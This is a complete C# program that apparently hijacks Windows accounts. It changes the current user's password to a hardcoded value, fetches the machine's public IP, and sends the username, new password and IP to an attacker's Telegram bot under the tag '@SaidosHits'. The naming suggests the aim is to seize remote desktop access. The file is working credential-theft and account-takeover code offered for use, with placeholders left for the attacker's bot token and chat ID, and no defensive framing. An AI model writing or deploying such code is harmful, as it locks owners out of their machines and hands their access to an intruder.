using System;
using System.DirectoryServices.AccountManagement;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        try
        {
            // Get the current public IP address
            string publicIpAddress = await GetPublicIpAddressAsync();

            // Change the password of the current user
            string newPassword = "Rdpsaidos52@E"; // Replace with the new password
            string currentUsername = Environment.UserName;
            ChangePasswordForCurrentUser(newPassword);

            Console.WriteLine("Done :)");

            // Send the new password, username, and public IP address to the Telegram bot
            await SendTelegramMessageAsync(currentUsername, newPassword, publicIpAddress);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    static async Task<string> GetPublicIpAddressAsync()
    {
        using (HttpClient httpClient = new HttpClient())
        {
            // Get the current public IP address from the ipify API
            return await httpClient.GetStringAsync("https://api.ipify.org");
        }
    }

    static void ChangePasswordForCurrentUser(string newPassword)
    {
        using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
        {
            UserPrincipal user = UserPrincipal.FindByIdentity(context, Environment.UserName);

            if (user != null)
            {
                user.SetPassword(newPassword);
                user.Save();
            }
            else
            {
                throw new InvalidOperationException("Current user not found.");
            }
        }
    }

    static async Task SendTelegramMessageAsync(string username, string newPassword, string publicIpAddress)
    {
        using (HttpClient client = new HttpClient())
        {
            string botToken = "bot token"; // Replace with your Telegram bot token
            string chatId = "chat id "; // Replace with your Telegram chat ID

            string message = $"========= @SaidosHits =========\n ✳️ IP: {publicIpAddress} \n 👤 Username: {username} \n 🔑 Password: {newPassword} \n ===============";

            string apiUrl = $"https://api.telegram.org/bot{botToken}/sendmessage?chat_id={chatId}&text={message}";

            // Send a POST request to the Telegram Bot API
            HttpResponseMessage response = await client.PostAsync(apiUrl, new StringContent(string.Empty, Encoding.UTF8, "application/json"));

            // Check if the request was successful
            response.EnsureSuccessStatusCode();

            // Read the response content as a string
            string responseBody = await response.Content.ReadAsStringAsync();

            Console.WriteLine($"Telegram API Response: {responseBody}");
        }
    }
}
